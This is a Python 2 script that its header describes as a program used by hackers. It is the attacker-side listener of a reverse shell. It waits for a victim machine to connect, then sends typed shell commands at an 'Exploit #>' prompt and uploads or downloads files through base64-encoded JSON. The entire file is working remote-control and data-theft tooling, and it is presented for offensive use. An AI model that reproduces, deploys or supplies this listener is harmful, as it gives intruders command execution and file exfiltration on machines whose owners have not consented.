# This is the python program which use by hacker
# !/usr/bin/env python

__author__ = 'Yasiru Senerath Karunanayka'
__date__ = '06-jun-2019'

import socket
import json
import os
import base64
from termcolor import colored


class Listener:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = int(port)

        # creating the socket object called connection
        listen = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listen.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listen.bind((self.ip, self.port))
        listen.listen(0)

        print(colored('[+]waiting for incoming connections', 'yellow'))
        self.connection, address = listen.accept()
        print(colored('[+]connection established | {} {} |\n'.format(address[0], address[1]), 'green', attrs=['bold']))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ''
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        result = self.reliable_receive()
        return result

    def upload_file(self, path):
        path_string = os.getcwd() + '/' + path
        self.reliable_send(['upload', path])
        try:
            with open(path_string, 'rb') as my_file:
                file_content = my_file.read()
            self.reliable_send(base64.b64encode(file_content))

            status = self.reliable_receive()
            if status == '':
                print(colored('[-] Error in uploading!!! \n', 'red'))
            else:
                print(colored('[+] Upload Complete! \n', 'green'))
        except:
            print(colored('[-] Error in uploading!!! \n', 'red'))

    def download_file(self, path):
        self.reliable_send(path)
        file_content = self.reliable_receive()
        if base64.b64decode(file_content) != '':
            file_name = path[-1].split('/')[-1]
            my_file = open(file_name, 'wb')
            my_file.write(base64.b64decode(file_content))
            my_file.close()
            print(colored('[+] Download Complete! \n', 'green'))
        else:
            print(colored('[-] Error in Download!!! \n', 'red'))

    def start(self):
        try:
            while True:
                command = raw_input(colored('Exploit #>', 'white', attrs=['bold', 'underline']) + ' ').split()

                if command[0] == 'quit':
                    self.reliable_send(command)
                    print(colored('[+]Connection is closed', 'green'))
                    exit(0)
                elif command[0] == 'download':
                    self.download_file(command)
                elif command[0] == 'upload':
                    self.upload_file(command[1])

                else:
                    self.reliable_send(command)
                    result = self.reliable_receive()
                    print result

        except KeyboardInterrupt:
            self.reliable_send(['quit'])
            print(colored('[+]Connection is closed', 'green'))
            exit(0)
